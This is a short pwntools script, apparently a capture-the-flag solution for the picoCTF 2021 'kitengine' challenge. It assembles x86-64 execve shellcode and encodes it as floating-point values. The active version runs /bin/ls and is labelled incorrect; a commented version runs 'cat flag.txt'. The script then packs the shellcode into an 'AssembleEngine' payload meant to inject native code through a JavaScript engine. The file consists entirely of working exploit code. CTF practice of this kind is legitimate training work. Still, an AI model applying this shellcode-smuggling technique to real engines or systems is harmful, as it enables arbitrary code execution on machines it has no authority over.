from pwn import *
import struct

context.os = 'linux'
context.arch = 'amd64'

## incorrect
## first step: execute /bin/ls
shellcode = asm("""
    xor    rdx,rdx
    movabs rbx,0x736c2f6e69622f2f
    shr    rbx,0x8
    push   rbx
    mov    rdi,rsp
    push   rax
    push   rdi
    mov    rsi,rsp
    mov    al,0x3b
    syscall                       
""")

## correct
### ref. https://ret2home.github.io/blog/CTF/picoctf-2021/pwn/kitengine/
# shellcode = asm("""
#     xor rax, rax
#     xor rbx, rbx
#     push rbx
#     mov rbx, 0x7478742e67616c66
#     push rbx
#     push rsp
#     pop rbx
#     xor rcx, rcx
#     push rcx
#     mov rcx, 0x7461632f6e69622f
#     push rcx
#     push rsp
#     pop rcx
#     push rax
#     push rbx
#     push rcx
#     push rsp
#     pop rsi
#     xor rbx, rbx
#     push rbx
#     mov rbx, 0x7461632f6e69622f
#     push rbx
#     push rsp
#     pop rdi
#     mov rax,0x3b
#     cdq
#     syscall
#     """)

print(shellcode.hex())
print(shellcode, len(shellcode))

if len(shellcode) % 8 != 0:
    shellcode += asm("nop") * (8 - len(shellcode) % 8)

print(shellcode, len(shellcode))

array = []
for i in range(len(shellcode)//8):
    print(shellcode[i*8:(i+1)*8].hex())
    array.append(str(struct.unpack("<d", shellcode[i*8:(i+1)*8])[0]))
print(array)

payload = f"AssembleEngine([{','.join(array)}])"
print(payload)